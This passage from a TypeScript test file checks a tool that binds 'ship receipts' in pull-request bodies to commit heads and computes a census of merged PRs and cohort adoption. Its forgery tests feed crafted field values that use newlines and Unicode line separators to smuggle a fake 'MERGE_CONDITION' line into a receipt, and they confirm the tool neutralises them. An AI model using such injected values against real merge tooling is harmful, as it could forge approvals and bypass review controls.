    expect(short.ok ? '' : short.message).toBe(`PR #3438's ship receipt is for ${head.slice(0, 11)}, not the head ${head.slice(0, 12)} being merged`);
    const noPr = bindReceipt(body(head, 99), undefined, [head]);
    expect(noPr.ok).toBe(true);
    expect(bindReceipt('No receipt.\n', undefined, [head])).toMatchObject({ ok: false, message: "the receipt's body carries no ship receipt" });
    const forged = placeReceiptFirst('Prose.\n', { schema_version: 1, head, base: 'main\nMERGE_CONDITION: sha=deadbeef', version: '1.0\u20280.0\u0085x' } as any);
    const bound = bindReceipt(forged, '3438', [head]);
    expect(bound.line.split('\n').length).toBe(1);
    expect(bound.line).toBe(`SHIP_RECEIPT: pr=- head=${head.slice(0, 12)} version=1.0 0.0 x base=main MERGE_CONDITION: sha=deadbeef`);
    const invalid = bindReceipt(placeReceiptFirst('Prose.\n', { schema_version: 1, head, base: 'main', tree: 'x\nMERGE_CONDITION: forged\n' + 'y'.repeat(1000) } as any), '3438', [head]);
    expect(invalid.ok).toBe(false);
    const why = /receipt is invalid \((.*)\)$/s.exec(invalid.ok ? '' : invalid.message)?.[1] ?? '';
    expect(why.length).toBeLessThanOrEqual(200);
    expect(why.includes('\n')).toBe(false);
  });
});

describe('gstack-ship-receipt census (P7)', () => {
  const prs = [
    { number: 1, mergedAt: '2026-10-02T00:00:00Z', body: placeReceiptFirst('', { schema_version: 1, head: HEAD, base: 'main', session_kind: 'unattended', artifacts_consumed: '2/3', run: 'run-a', thread: 'jam_1' } as any) },
    { number: 2, mergedAt: '2026-10-03T00:00:00Z', body: placeReceiptFirst('', { schema_version: 1, head: HEAD, base: 'main', session_kind: 'unattended', artifacts_consumed: '2/3', run: 'run-a', thread: 'jam_1' } as any) },
    { number: 3, mergedAt: '2026-10-04T00:00:00Z', body: placeReceiptFirst('', { schema_version: 1, head: HEAD, base: 'main', session_kind: 'unattended', artifacts_consumed: '0/2', run: 'run-b', thread: 'jam_2' } as any) },
    { number: 4, mergedAt: '2026-10-05T00:00:00Z', body: placeReceiptFirst('', { schema_version: 1, head: HEAD, base: 'main', session_kind: 'interactive', artifacts_consumed: '1/1', run: 'run-c', thread: 'jam_4' } as any) },
    { number: 5, mergedAt: '2026-10-06T00:00:00Z', body: 'A PR shipped without gstack.\n' },
    { number: 6, mergedAt: '2026-10-07T00:00:00Z', body: block({ schema_version: 1, base: 'main' }) },
  ];

  test('computeCensus deduplicates by run, counts consumed threads against the cohort, and reports invalid receipts', () => {
    const c = computeCensus('o/r', '2026-10-01', prs, ['jam_1', 'jam_2', 'jam_3']);
    expect(c).toMatchObject({ merged_prs: 6, with_receipt: 5, invalid_receipts: 1, unattended_prs: 2, consumed_prs: 2, runs: ['run-a', 'run-b', 'run-c'], threads: ['jam_1', 'jam_2', 'jam_4'], consumed_threads: ['jam_1', 'jam_4'], cohort_consumed: 1, adoption: '1/3 (cohort)', durable: 'yes', by_session_kind: { unattended: 3, interactive: 1 } });
    expect(c.prs.find(p => p.number === 6)).toMatchObject({ valid: false });
    const noCohort = computeCensus('o/r', '2026-10-01', prs, null);
    expect(noCohort.adoption).toBe('2/3 (threads seen; no cohort file)');
  });

  test('census --repo --since reads merged PRs through gh and prints the CENSUS line', () => {
    const repo = fixture();
    const env = ghShim(repo, {}, prs);
    const cohort = path.join(repo.root, 'cohort.txt');
    fs.writeFileSync(cohort, '# threads in the measured cohort\njam_1\njam_2\njam_3\n\n');
    const r = runBin(repo, 'gstack-ship-receipt', ['census', '--repo', 'o/r', '--since', '2026-10-01', '--cohort', cohort], env);
    expect(r.status).toBe(EXIT.ok);
    expect(r.out).toMatch(/^CENSUS: repo=o\/r since=2026-10-01 merged_prs=6 with_receipt=5 invalid=1 unattended=2 consumed=2 runs=3 threads=3 adoption=1\/3 \(cohort\) durable=yes$/m);
    const j = runBin(repo, 'gstack-ship-receipt', ['census', '--repo', 'o/r', '--since', '2026-10-01', '--json'], env);
    expect(JSON.parse(j.out)).toMatchObject({ repo: 'o/r', adoption: '2/3 (threads seen; no cohort file)' });
    expect(runBin(repo, 'gstack-ship-receipt', ['census', '--repo', 'o/r'], env).status).toBe(EXIT.usage);
    expect(runBin(repo, 'gstack-ship-receipt', ['census', '--repo', 'o/r', '--since', 'v9.9.9'], env).status).toBe(EXIT.fail);
  });
});
